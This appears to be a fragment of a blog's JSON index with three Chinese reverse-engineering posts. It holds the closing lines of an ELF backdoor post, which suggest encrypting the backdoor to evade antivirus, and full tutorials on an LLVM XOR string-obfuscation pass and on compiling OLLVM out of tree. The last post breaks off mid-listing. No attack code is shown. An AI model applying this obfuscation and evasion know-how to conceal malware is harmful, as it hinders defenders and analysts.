https://gist.github.com/chenx6/0cedc163bea2aaefd433fff7d02cd4c1，如果访问不了的话可以手动复制粘贴代码，应该可以拼接成可以运行的程序。\n未完成工作 这个代码只是一个简单的 DEMO，想要扩展成可维护的软件的话，我个人有下面几个发展方向\n将 pack 和 unpack 进行封装，类似 pwntools。 对 32 位 ELF 文件及其他架构 CPU 的支持可以由增加 ELF 信息来实现，例如在 ELF 信息中将字节序，每一种类型的长度，提取方法通过 ELF 信息类的成员来进行描述。 本文只实现了当 Code Cave 存在时的后门植入，如果没有 Code Cave 时候需要扩展文件来实现后门植入。 对辅助代码及后门代码进行改写，加密以实现绕过杀毒软件。 使用还在维护的库对 ELF 进行 Patch，例如 LIEF。 refs exploit database https://www.exploit-db.com\nThe backdoor factoryhttps://github.com/secretsquirrel/the-backdoor-factory/\nUCLib 关于 ELF 格式的文档https://uclibc.org/docs/elf-64-gen.pdf\n看不进去英文可以配合 CSDN 这篇文章 https://blog.csdn.net/feglass/article/details/51469511\n","date":"2020-01-01","permalink":"https://chenx6.github.io/post/elf_backdoor/","tags":["re","mal","backdoor"],"title":"给 ELF 文件加上后门"},{"content":"这个项目可以作为我看了这么久 LLVM 的 Docs 助眠的一个小总结吧。这个项目主要就是给函数使用的常量字符串进行加密，在程序被静态分析的时候干扰分析。当然找到思路后，这个混淆还是很容易解开的。\n吐槽下，网上的文章质量参差不齐，写的让人不知所云的，真的恐怖。所以还是面向 Stackoverflow 和官方文档编程吧\u0026hellip;\n为了写 LLVM Pass ，首先得看看 LLVM Programmers\u0026rsquo; Manual，里面讲了许多代码样例，API 讲解和类的层次结构。当然这只是基础，具体的使用得看使用 doxygen 生成的文档。\n当然也得对 LLVM IR 也得有一定了解 https://llvm.org/docs/LangRef.html\nPass 思路概述 首先是找到字符串，其次是找到用这个字符串的函数，在这个函数被调用前，先调用解密函数进行解密。最后加密原本字符串。\n开发环境准备 编译环境请参考上一篇文章，只是写个 Pass 而已，不要再从整个 LLVM 项目开始编译了好吗\u0026hellip;\n这里使用的是 VSCode + WSL 搭建开发环境，在项目文件夹的 \u0026ldquo;.vscode/c_cpp_properties.json\u0026rdquo; 加上对应的 \u0026ldquo;includePath\u0026rdquo; 就有智能提示了。\n{\r\u0026quot;includePath\u0026quot;: [\r\u0026quot;${workspaceFolder}/**\u0026quot;,\r\u0026quot;/usr/include/llvm-8\u0026quot;,\r\u0026quot;/usr/include/llvm-c-8\u0026quot;\r]\r}\r由于使用 CMake 来管理编译依赖，所以给 VSCode 加上 CMake 插件，可以实现小部分 CMake GUI 的功能。\n代码讲解 基本框架 首先是 include 的头文件，项目里用了 LLVM 自己的 SmallVector，还有 IR 下面的 Function, GlobalVariable, IRBuilder, Instructions，还有些 Pass 必备的一些头文件，raw_ostream 用来调试输出。\n#include \u0026quot;llvm/ADT/SmallVector.h\u0026quot;\r#include \u0026quot;llvm/IR/Function.h\u0026quot;\r#include \u0026quot;llvm/IR/GlobalVariable.h\u0026quot;\r#include \u0026quot;llvm/IR/IRBuilder.h\u0026quot;\r#include \u0026quot;llvm/IR/InstrTypes.h\u0026quot;\r#include \u0026quot;llvm/IR/Instructions.h\u0026quot;\r#include \u0026quot;llvm/IR/LegacyPassManager.h\u0026quot;\r#include \u0026quot;llvm/Pass.h\u0026quot;\r#include \u0026quot;llvm/Support/FormatVariadic.h\u0026quot;\r#include \u0026quot;llvm/Support/raw_ostream.h\u0026quot;\r#include \u0026quot;llvm/Transforms/IPO/PassManagerBuilder.h\u0026quot;\r#include \u0026lt;map\u0026gt;\r#include \u0026lt;vector\u0026gt;\r然后是 LLVM Pass 的基本框架。这里实现的是 Module Pass，所以这个 Pass 继承于 ModulePass。最后两行代码是用于注册 Pass，注册之后在 opt -load libpass.so -help 就能找到这个 Pass 了。\n加密函数只用了简单的 xor 来进行加密。需要注意的是不要把字符串的最后一位 \u0026lsquo;\\0\u0026rsquo; 给 xor 了。\nusing namespace llvm;\rnamespace {\r/// encrypt strings with xor.\r/// \\param s input string for encrypt.\rvoid encrypt(std::string \u0026amp;s) {\rfor (int i = 0; i \u0026lt; s.length() - 1; i++) {\rs[i] ^= 42;\r}\r}\r/// A pass for obfuscating const string in modules.\rstruct ObfuscatePass : public ModulePass {\rstatic char ID;\rObfuscatePass() : ModulePass(ID) {}\rvirtual bool runOnModule(Module \u0026amp;M) {\rreturn true;\r}\r};\r} // namespace\rchar ObfuscatePass::ID = 0;\rstatic RegisterPass\u0026lt;ObfuscatePass\u0026gt; X(\u0026quot;obfstr\u0026quot;, \u0026quot;obfuscate string\u0026quot;);\rrunOnModule 函数 然后开始讲解具体的代码。下面的代码是在寻找全局变量，并且找到他的使用者。\n首先通过 GlobalVariable GVar-\u0026gt;users() 来找到使用者。如果使用者不是单独的指令，而是类似 i8* getelementptr ... 这样的语句，则寻找这个语句的使用者。如果发现这个语句只有 CallInst 类型的使用者，则对字符串进行加密，并去除对应字符串的常量属性。\nvirtual bool runOnModule(Module \u0026amp;M) {\rfor (GlobalValue \u0026amp;GV : M.globals()) {\rGlobalVariable *GVar = dyn_cast\u0026lt;GlobalVariable\u0026gt;(\u0026amp;GV);\rif (GVar == nullptr) {\rcontinue;\r}\rstd::vector\u0026lt;std::pair\u0026lt;Instruction *, User *\u0026gt;\u0026gt; Target;\rbool hasExceptCallInst = false;\r// Find all user and encrypt const value, then insert decrypt function.\rfor (User *Usr : GVar-\u0026gt;users()) {\r// Get instruction.\rInstruction *Inst = dyn_cast\u0026lt;Instruction\u0026gt;(Usr);\rif (Inst == nullptr) {\r// If Usr is not an instruction, like i8* getelementptr...\r// Dig deeper to find Instruction.\rfor (User *DirecUsr : Usr-\u0026gt;users()) {\rInst = dyn_cast\u0026lt;Instruction\u0026gt;(DirecUsr);\rif (Inst == nullptr) {\rcontinue;\r}\rif (!isa\u0026lt;CallInst\u0026gt;(Inst)) {\rhasExceptCallInst = true;\rTarget.clear();\r} else {\rTarget.emplace_back(std::pair\u0026lt;Instruction *, User *\u0026gt;(Inst, Usr));\r}\r}\r}\r}\rif (hasExceptCallInst == false \u0026amp;\u0026amp; Target.size() == 1) {\rfor (auto \u0026amp;T: Target) {\robfuscateString(M, T.first, T.second, GVar);\r}\r// Change constant to variable.\rGVar-\u0026gt;setConstant(false);\r}\r}\rreturn true;\r}\robfuscateString 函数 函数中主要分为下面三个部分\n替换字符串为加密字符串 创建函数声明 创建调用指令 下面是加密字符串常量的语句，这里先将常量转换成 ConstantDataArray，用 getAsString() 提取字符串，最后用加密后的字符串创建 Constant 替换原来字符串。\n// Encrypt origin string and replace it encrypted string.\rConstantDataArray *GVarArr =\rdyn_cast\u0026lt;ConstantDataArray\u0026gt;(GVar-\u0026gt;getInitializer());\rif (GVarArr == nullptr) {\rcontinue;\r}\rstd::string Origin;\rif (GVarArr-\u0026gt;isString(8)) {\rOrigin = GVarArr-\u0026gt;getAsString().str();\r} else if (GVarArr-\u0026gt;isCString()) {\rOrigin = GVarArr-\u0026gt;getAsCString().str();\r}\rencrypt(Origin);\rConstant *NewConstStr = ConstantDataArray::getString(\rGVarArr-\u0026gt;getContext(), StringRef(Origin), false);\rGVarArr-\u0026gt;replaceAllUsesWith(NewConstStr);\r然后是使用 IRBuilder 创建相关语句和函数调用。首先通过 getOrInsertFunction 插入或获取函数，然后使用 builder.CreateCall(); 语句创建调用解密和加密函数的指令。\n由于调用顺序是 解密字符串函数 -\u0026gt; 使用字符串函数 -\u0026gt; 加密字符串函数，加密函数得插入使用指令的后方，而不是和 IRBuilder 创建的指令一样待在使用指令的前方。所以这里不使用 IRBuilder 创建指令，而是手动创建指令 + 手动插入。\n// Insert decrypt function above Inst with IRBuilder.\rIRBuilder\u0026lt;\u0026gt; builder(Inst);\rType *Int8PtrTy = builder.getInt8PtrTy();\r// Create decrypt function in GlobalValue / Get decrypt function.\rSmallVector\u0026lt;Type *, 1\u0026gt; FuncArgs = {Int8PtrTy};\rFunctionType *FuncType = FunctionType::get(Int8PtrTy, FuncArgs, false);\rConstant *DecryptFunc = M.getOrInsertFunction(\u0026quot;__decrypt\u0026quot;, FuncType);\rConstant *EncryptFunc = M.getOrInsertFunction(\u0026quot;__encrypt\u0026quot;, FuncType);\r// Create call instrucions.\rSmallVector\u0026lt;Value *, 1\u0026gt; CallArgs = {Usr};\rCallInst *DecryptInst = builder.CreateCall(FuncType, DecryptFunc, CallArgs);\rCallInst *EncryptInst = CallInst::Create(FuncType, EncryptFunc, CallArgs);\rEncryptInst-\u0026gt;insertAfter(Inst);\r__encrypt 和 __decrypt 函数 由于只是 xor，所以函数的代码很相似。\nchar *__decrypt(char *encStr) {\rchar *curr = encStr;\rwhile (*curr) {\r*curr ^= 42;\rcurr++;\r}\rreturn encStr;\r}\rchar *__encrypt(char *originStr) {\rchar *curr = originStr;\rwhile (*curr) {\r*curr ^= 42;\rcurr++;\r}\rreturn originStr;\r}\rPass 的简单使用 首先将需要加密的文件和含有加密函数的文件编译成后缀为 .ll 的 LLVM IR 形式，然后使用 opt 来对需要加密的文件进行加密，最后则是将含有加密函数的文件和需要加密的文件进行链接，生成二进制文件。\n将下面的脚本保存为 \u0026ldquo;run.sh\u0026rdquo; 后，就可以使用 bash run.sh test.c 来编译程序了。\nfullname=${1}\rbasename=${fullname/.c/}\rclang-8 -emit-llvm -S ${fullname} -o ${basename}.ll\rclang-8 -emit-llvm -S encrypt.c -o encrypt.ll\ropt-8 -p \\\r-load ../build/obfuscate/libobfuscate.so \\\r-obfstr ${basename}.ll \\\r-o ${basename}_out.bc\rllvm-link-8 encrypt.ll ${basename}_out.bc -o final.bc\rclang-8 final.bc -o final.out\r混淆效果 下面是测试程序的代码。\n#include \u0026lt;stdio.h\u0026gt;\rint main() {\rputs(\u0026quot;This is a testing string!\u0026quot;);\rchar ch;\rif ((ch = getchar()) == '6') {\rprintf(\u0026quot;6666%c\\n\u0026quot;, ch);\r} else {\rprintf(\u0026quot;WTF?!\\n\u0026quot;);\r}\rreturn 0;\r}\r下面是使用 clang-8 -emit-llvm -S test.c -o test.ll 直接编译出的 IR。\n@.str = private unnamed_addr constant [26 x i8] c\u0026quot;This is a testing string!\\00\u0026quot;, align 1\r@.str.1 = private unnamed_addr constant [8 x i8] c\u0026quot;6666%c\\0A\\00\u0026quot;, align 1\r@.str.2 = private unnamed_addr constant [7 x i8] c\u0026quot;WTF?!\\0A\\00\u0026quot;, align 1\r; Function Attrs: noinline nounwind optnone uwtable\rdefine dso_local i32 @main() #0 {\r%1 = alloca i32, align 4\r%2 = alloca i8, align 1\rstore i32 0, i32* %1, align 4\r%3 = call i32 @puts(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i32 0, i32 0))\r%4 = call i32 @getchar()\r%5 = trunc i32 %4 to i8\rstore i8 %5, i8* %2, align 1\r%6 = sext i8 %5 to i32\r%7 = icmp eq i32 %6, 54\rbr i1 %7, label %8, label %12\r; \u0026lt;label\u0026gt;:8: ; preds = %0\r%9 = load i8, i8* %2, align 1\r%10 = sext i8 %9 to i32\r%11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i32 %10)\rbr label %14\r; \u0026lt;label\u0026gt;:12: ; preds = %0\r%13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))\rbr label %14\r; \u0026lt;label\u0026gt;:14: ; preds = %12, %8\rret i32 0\r}\r下面是使用 opt-8 -p -load ../build/obfuscate/libobfuscate.so -obfstr test.ll -o test.bc 调用 Pass 得到的混淆过的 IR，可以发现字符串已经被混淆成功了。\n@.str = private unnamed_addr global [26 x i8] c\u0026quot;~BCY\\0ACY\\0AK\\0A^OY^CDM\\0AY^XCDM\\0B\\00\u0026quot;, align 1\r@.str.1 = private unnamed_addr global [8 x i8] c\u0026quot;\\1C\\1C\\1C\\1C\\0FI \\00\u0026quot;, align 1\r@.str.2 = private unnamed_addr global [7 x i8] c\u0026quot;}~l\\15\\0B \\00\u0026quot;, align 1\r; Function Attrs: noinline nounwind optnone uwtable\rdefine dso_local i32 @main() #0 {\r%1 = alloca i32, align 4\r%2 = alloca i8, align 1\rstore i32 0, i32* %1, align 4\r%3 = call i8* @__decrypt(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i32 0, i32 0))\r%4 = call i32 @puts(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i32 0, i32 0))\r%5 = call i8* @__encrypt(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i32 0, i32 0))\r%6 = call i32 @getchar()\r%7 = trunc i32 %6 to i8\rstore i8 %7, i8* %2, align 1\r%8 = sext i8 %7 to i32\r%9 = icmp eq i32 %8, 54\rbr i1 %9, label %10, label %16\r; \u0026lt;label\u0026gt;:10: ; preds = %0\r%11 = load i8, i8* %2, align 1\r%12 = sext i8 %11 to i32\r%13 = call i8* @__decrypt(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0))\r%14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i32 %12)\r%15 = call i8* @__encrypt(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0))\rbr label %20\r; \u0026lt;label\u0026gt;:16: ; preds = %0\r%17 = call i8* @__decrypt(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))\r%18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))\r%19 = call i8* @__encrypt(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))\rbr label %20\r; \u0026lt;label\u0026gt;:20: ; preds = %16, %10\rret i32 0\r}\r在 IDA 中也可以看到混淆的效果。\n0\n完整代码 obfuscate.cpp\n//===-- obfuscate/obfuscate.cpp - main file of obfuscate_string -*- C++ -*-===//\r//\r// The main file of the obfusate_string pass.\r// LLVM project is under the Apache License v2.0 with LLVM Exceptions.\r// See https://llvm.org/LICENSE.txt for license information.\r// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\r//\r//===----------------------------------------------------------------------===//\r///\r/// \\file\r/// This file contains the module pass class and decrypt function.\r///\r//===----------------------------------------------------------------------===//\r#include \u0026quot;llvm/ADT/SmallVector.h\u0026quot;\r#include \u0026quot;llvm/IR/Function.h\u0026quot;\r#include \u0026quot;llvm/IR/GlobalVariable.h\u0026quot;\r#include \u0026quot;llvm/IR/IRBuilder.h\u0026quot;\r#include \u0026quot;llvm/IR/InstrTypes.h\u0026quot;\r#include \u0026quot;llvm/IR/Instructions.h\u0026quot;\r#include \u0026quot;llvm/IR/LegacyPassManager.h\u0026quot;\r#include \u0026quot;llvm/Pass.h\u0026quot;\r#include \u0026quot;llvm/Support/FormatVariadic.h\u0026quot;\r#include \u0026quot;llvm/Support/raw_ostream.h\u0026quot;\r#include \u0026quot;llvm/Transforms/IPO/PassManagerBuilder.h\u0026quot;\r#include \u0026lt;map\u0026gt;\r#include \u0026lt;vector\u0026gt;\rusing namespace llvm;\rnamespace {\r/// encrypt strings with xor.\r/// \\param s input string for encrypt.\rvoid encrypt(std::string \u0026amp;s) {\rfor (int i = 0; i \u0026lt; s.length() - 1; i++) {\rs[i] ^= 42;\r}\r}\r/// A pass for obfuscating const string in modules.\rstruct ObfuscatePass : public ModulePass {\rstatic char ID;\rObfuscatePass() : ModulePass(ID) {}\rvirtual bool runOnModule(Module \u0026amp;M) {\rfor (GlobalValue \u0026amp;GV : M.globals()) {\rGlobalVariable *GVar = dyn_cast\u0026lt;GlobalVariable\u0026gt;(\u0026amp;GV);\rif (GVar == nullptr) {\rcontinue;\r}\rstd::vector\u0026lt;std::pair\u0026lt;Instruction *, User *\u0026gt;\u0026gt; Target;\rbool hasExceptCallInst = false;\r// Find all user and encrypt const value, then insert decrypt function.\rfor (User *Usr : GVar-\u0026gt;users()) {\r// Get instruction.\rInstruction *Inst = dyn_cast\u0026lt;Instruction\u0026gt;(Usr);\rif (Inst == nullptr) {\r// If Usr is not an instruction, like i8* getelementptr...\r// Dig deeper to find Instruction.\rfor (User *DirecUsr : Usr-\u0026gt;users()) {\rInst = dyn_cast\u0026lt;Instruction\u0026gt;(DirecUsr);\rif (Inst == nullptr) {\rcontinue;\r}\rif (!isa\u0026lt;CallInst\u0026gt;(Inst)) {\rhasExceptCallInst = true;\rTarget.clear();\r} else {\rTarget.emplace_back(std::pair\u0026lt;Instruction *, User *\u0026gt;(Inst, Usr));\r}\r}\r}\r}\rif (hasExceptCallInst == false \u0026amp;\u0026amp; Target.size() == 1) {\rfor (auto \u0026amp;T: Target) {\robfuscateString(M, T.first, T.second, GVar);\r}\r// Change constant to variable.\rGVar-\u0026gt;setConstant(false);\r}\r}\rreturn true;\r}\r/// Obfuscate string and add decrypt function.\r/// \\param M Module\r/// \\param Inst Instruction\r/// \\param Usr User of the \\p GlobalVariable\r/// \\param GVar The const string\rvoid obfuscateString(Module \u0026amp;M, Instruction *Inst, Value *Usr,\rGlobalVariable *GVar) {\r// Encrypt origin string and replace it encrypted string.\rConstantDataArray *GVarArr =\rdyn_cast\u0026lt;ConstantDataArray\u0026gt;(GVar-\u0026gt;getInitializer());\rif (GVarArr == nullptr) {\rreturn;\r}\rstd::string Origin;\rif (GVarArr-\u0026gt;isString(8)) {\rOrigin = GVarArr-\u0026gt;getAsString().str();\r} else if (GVarArr-\u0026gt;isCString()) {\rOrigin = GVarArr-\u0026gt;getAsCString().str();\r}\rencrypt(Origin);\rConstant *NewConstStr = ConstantDataArray::getString(\rGVarArr-\u0026gt;getContext(), StringRef(Origin), false);\rGVarArr-\u0026gt;replaceAllUsesWith(NewConstStr);\r// Insert decrypt function above Inst with IRBuilder.\rIRBuilder\u0026lt;\u0026gt; builder(Inst);\rType *Int8PtrTy = builder.getInt8PtrTy();\r// Create decrypt function in GlobalValue / Get decrypt function.\rSmallVector\u0026lt;Type *, 1\u0026gt; FuncArgs = {Int8PtrTy};\rFunctionType *FuncType = FunctionType::get(Int8PtrTy, FuncArgs, false);\rConstant *DecryptFunc = M.getOrInsertFunction(\u0026quot;__decrypt\u0026quot;, FuncType);\r// Create call instrucions.\rSmallVector\u0026lt;Value *, 1\u0026gt; CallArgs = {Usr};\rCallInst *DecryptInst = builder.CreateCall(FuncType, DecryptFunc, CallArgs);\rConstant *EncryptFunc = M.getOrInsertFunction(\u0026quot;__encrypt\u0026quot;, FuncType);\rCallInst *EncryptInst = CallInst::Create(FuncType, EncryptFunc, CallArgs);\rEncryptInst-\u0026gt;insertAfter(Inst);\r}\r};\r} // namespace\rchar ObfuscatePass::ID = 0;\rstatic RegisterPass\u0026lt;ObfuscatePass\u0026gt; X(\u0026quot;obfstr\u0026quot;, \u0026quot;obfuscate string\u0026quot;);\rencrypt.c\nchar *__decrypt(char *encStr) {\rchar *curr = encStr;\rwhile (*curr) {\r*curr ^= 42;\rcurr++;\r}\rreturn encStr;\r}\rchar *__encrypt(char *originStr) {\rchar *curr = originStr;\rwhile (*curr) {\r*curr ^= 42;\rcurr++;\r}\rreturn originStr;\r}\r","date":"2020-01-01","permalink":"https://chenx6.github.io/post/obfuscate_string/","tags":["re","llvm"],"title":"使用 LLVM Pass 实现字符串加密"},{"content":"在网络上流传的编译 LLVM Pass 都需要一份 LLVM 源码，从整个源代码编译，编译非常花时间 (i7 6700HQ 使用 make -j8 编译整个项目花了近 50 分钟)，所以在翻阅文档时发现 LLVM 支持在代码树外编译，在 1 分钟内编译一个 Pass，还是非常香的。\n项目配置 项目目录结构 本次作为示范的 OLLVM 是一个使用 LLVM Pass 进行代码混淆的项目。他的主要文件在于 ${LLVM 项目目录}/lib/Transforms/Obfuscation/ 和 ${LLVM 项目目录}/include/llvm/Transforms/Obfuscation/。将这两个目录下的文件放入对应的目录就可以在代码树外编译 OLLVM 了。OLLVM 相关的文件可以在 GitHub 找到。\n在项目根目录放置主要的 CMakeLists.txt 和 代码目录，然后在代码目录中放代码和编译相关的 CMakeLists.txt 。项目结构类似下面。\n$ tree ollvm\rollvm\r├── CMakeLists.txt\r└── Obfuscation\r├── BogusControlFlow.cpp\r├── CMakeLists.txt\r├── CryptoUtils.cpp\r├── Flattening.cpp\r├── SplitBasicBlocks.cpp\r├── Substitution.cpp\r├── Utils.cpp\r└── include\r├── BogusControlFlow.h\r├── CryptoUtils.h\r├── Flattening.h\r├── Split.h\r├── Substitution.h\r└── Utils.h\r2 directories, 14 files\r两个 CMakeLists.txt 第一个是项目目录下的 CMakeLists.txt，用来关联 LLVM 的文件，CMake 会按照一定的顺序寻找 LLVM 这个 Package，如果要手动指定的话使用 -DLLVM_DIR= 这个选项来指定。\ncmake_minimum_required(VERSION 3.10)\rfind_package(LLVM REQUIRED CONFIG)\radd_definitions(${LLVM_DEFINITIONS})\rinclude_directories(${LLVM_INCLUDE_DIRS})\radd_subdirectory(Obfuscation)\r下面是源代码目录下 CMakeLists.txt，用来编译出 Pass 的动态库文件。\ncmake_minimum_required(VERSION 3.10)\rinclude_directories(./include)\radd_library(LLVMObfuscation\rMODULE\rCryptoUtils.cpp\rSubstitution.cpp\rBogusControlFlow.cpp\rUtils.cpp\rSplitBasicBlocks.cpp\rFlattening.cpp\r)\radd_dependencies(LLVMObfuscation intrinsics_gen)\r代码魔改 由于 OLLVM 的代码是放在主代码树中的，所以在提取出代码树外后可能需要进行一点魔改才能让 Pass 正常工作。以 BogusControlFlow.cpp 为例，源代码的 runOnFunction() 函数中检测了 \u0026ldquo;bcf\u0026rdquo; 是否在全局声明中存在，但是将文件提取出来后，直接在 opt 加上相关参数就可以进行使用 Pass 了，所以将 if (toObfuscate(flag, \u0026amp;F, \u0026quot;bcf\u0026quot;)) 语句直接去除，留下混淆部分就行。\nvirtual bool runOnFunction(Function \u0026amp;F) {\r// Check if the percentage is correct\rif (ObfTimes \u0026lt;= 0) {\rerrs() \u0026lt;\u0026lt; \u0026quot;BogusControlFlow application number -bcf_loop=x must be x \u0026gt; 0\u0026quot;;\rreturn false;\r}\r// Check if the number of applications is correct\rif (!((ObfProbRate \u0026gt; 0) \u0026amp;\u0026amp; (ObfProbRate \u0026lt;= 100))) {\rerrs() \u0026lt;\u0026lt; \u0026quot;BogusControlFlow application basic blocks percentage \u0026quot;\r\u0026quot;-bcf_prob=x must be 0 \u0026lt; x \u0026lt;= 100\u0026quot;;\rreturn false;\r}\r// If fla annotations\rif (toObfuscate(flag, \u0026amp;F, \u0026quot;bcf\u0026quot;)) {\rbogus(F);\rdoF(*F.getParent());\rreturn true;\r}\r修改后代码如下。\nvirtual bool runOnFunction(Function \u0026amp;F) {\r// Check if the percentage is correct\rif (ObfTimes \u0026lt;= 0) {\rerrs() \u0026lt;\u0026lt; \u0026quot;BogusControlFlow application number -bcf_loop=x must be x \u0026gt; 0\u0026quot;;\rreturn false;\r}\r// Check if the number of applications is correct\rif (!((ObfProbRate \u0026gt; 0) \u0026amp;\u0026amp; (ObfProbRate \u0026lt;= 100))) {\rerrs() \u0026lt;\u0026lt; \u0026quot;BogusControlFlow application basic blocks percentage \u0026quot;\r\u0026quot;-bcf_prob=x must be 0 \u0026lt; x \u0026lt;= 100\u0026quot;;\rreturn false;\r}\rbogus(F);\rdoF(*F.getParent());\rreturn true;\r} // end of runOnFunction()\r开始编译 首先安装相关依赖，本文默认环境是 WSL Ubuntu 18.04\n$ apt update\r$ apt install cmake llvm-8 llvm-8-dev gcc # gcc/clang 都行\r在项目目录新建个 build 文件夹，然后通过 CMake 的特性在 build 文件夹生成 Makefiles，然后进行编译。-DLLVM_DIR 的参数需要根据 LLVMConfig.cmake 的位置进行改变。\n$ mkdir build \u0026amp;\u0026amp; cd build\r$ cmake .. -DLLVM_DIR=/usr/lib/llvm-8/lib/cmake/llvm/\r$ cmake --build . -- -j$(nproc)\r然后在 build/Obfuscation 下就会生成 libLLVMObfuscation.so\nPass 使用 找了份 OJ 上题目的代码\n#include \u0026lt;stdio.h\u0026gt;\rint main()\r{\rint score, enterFlag = 0;\rwhile (scanf(\u0026quot;%d\u0026quot;, \u0026amp;score) != EOF)\r{\rif (enterFlag)\rprintf(\u0026quot;\\n\u0026quot;);\relse if (!enterFlag)\renterFlag = 1;\rif (score \u0026gt;= 90 \u0026amp;\u0026amp; score \u0026lt;= 100)\rprintf(\u0026quot;Excellent\u0026quot;);\relse if (score \u0026gt;= 80 \u0026amp;\u0026amp; score \u0026lt; 90)\r{\rprintf(\u0026quot;Good\u0026quot;);\r}\relse if (score \u0026gt;= 70 \u0026amp;\u0026amp; score \u0026lt; 80)\r{\rprintf(\u0026quot;Average\u0026quot;);\r}\relse if (score \u0026gt;= 60 \u0026amp;\u0026amp; score \u0026lt; 70)\r{\rprintf(\u0026quot;Pass\u0026quot;);\r}\relse if (score \u0026gt;= 0 \u0026amp;\u0026amp; score \u0026lt; 60)\r{\rprintf(\u0026quot;Failing\u0026quot;);\r}\relse\r{\rprintf(\u0026quot;Error\u0026quot;);\r}\r}\rreturn 0;\r}\r先将代码编译成 LLVM IR (Bitcode 形式)，然后使用 opt 调用 Pass 进行混淆，最后进行编译\n$ clang-8 -emit-llvm -c F.c -o F.bc\r$ opt-8 -load ./libLLVMObfuscation.so -boguscf F.bc -o F_bogus.bc\r$ clang-8 F_bogus.bc -o F_bogus\r一波操作后 IDA F5 的反汇编如下。可以看到出现了虚假的跳转，让代码可读性变差了，说明 Pass 确实执行了。\n/* This file has been generated by the Hex-Rays decompiler.\rCopyright (c) 2007-2017 Hex-Rays \u0026lt;info@hex-rays.com\u0026gt;\rDetected compiler: GNU C++\r*/\r#include \u0026lt;defs.h\u0026gt;\r//-------------------------------------------------------------------------\r// Function declarations\r// int printf(const char *format, ...);\r// __int64 __fastcall __isoc99_scanf(_QWORD, _QWORD); weak\rint __cdecl main(int argc, const char **argv, const char **envp);\r//-------------------------------------------------------------------------\r// Data declarations\r_UNKNOWN unk_400F24; // weak\rint x; // weak\rint y; // weak\r//----- (0000000000400560) ----------------------------------------------------\rint __cdecl main(int argc, const char **argv, const char **envp)\r{\rbool v4; // [rsp+43h] [rbp-Dh]\rsigned int v5; // [rsp+44h] [rbp-Ch]\rint v6; // [rsp+48h] [rbp-8h]\rint v7; // [rsp+4Ch] [rbp-4h]\rv7 = 0;\rv5 = 0;\rwhile ( 1 )\r{\rif ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\rgoto LABEL_42;\rwhile ( 1 )\r{\rv4 = (unsigned int)__isoc99_scanf(\u0026amp;unk_400F24, \u0026amp;v6) != -1;\rif ( y \u0026lt; 10 || (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) == 0 )\rbreak;\rLABEL_42:\r__isoc99_scanf(\u0026amp;unk_400F24, \u0026amp;v6);\r}\rif ( !v4 )\rbreak;\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\rif ( v5 != 0 )\r{\rprintf(\u0026quot;\\n\u0026quot;);\r}\relse\r{\rif ( !v5 )\r{\rdo\rv5 = 1;\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 );\r}\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\r}\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\rif ( v6 \u0026lt; 90 || v6 \u0026gt; 100 )\r{\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\rif ( v6 \u0026gt;= 80 )\r{\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\rif ( v6 \u0026lt; 90 )\r{\rif ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\rgoto LABEL_49;\rwhile ( 1 )\r{\rprintf(\u0026quot;Good\u0026quot;);\rif ( y \u0026lt; 10 || (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) == 0 )\rgoto LABEL_38;\rLABEL_49:\rprintf(\u0026quot;Good\u0026quot;);\r}\r}\r}\rif ( v6 \u0026lt; 70 || v6 \u0026gt;= 80 )\r{\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\rif ( v6 \u0026lt; 60 || v6 \u0026gt;= 70 )\r{\rif ( v6 \u0026lt; 0 )\rgoto LABEL_59;\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\r;\rif ( v6 \u0026gt;= 60 )\r{\rLABEL_59:\rprintf(\u0026quot;Error\u0026quot;);\r}\relse\r{\rif ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) != 0 )\rgoto LABEL_52;\rwhile ( 1 )\r{\rprintf(\u0026quot;Failing\u0026quot;);\rif ( y \u0026lt; 10 || (((_BYTE)x - 1) * (_BYTE)x \u0026amp; 1) == 0 )\rbreak;\rLABEL_52:\rprintf(\u0026quot;Failing\u0026quot;);\r}\r}\rwhile ( y \u0026gt;= 10 \u0026amp;\u0026amp; (((_BYTE)x - 1) * 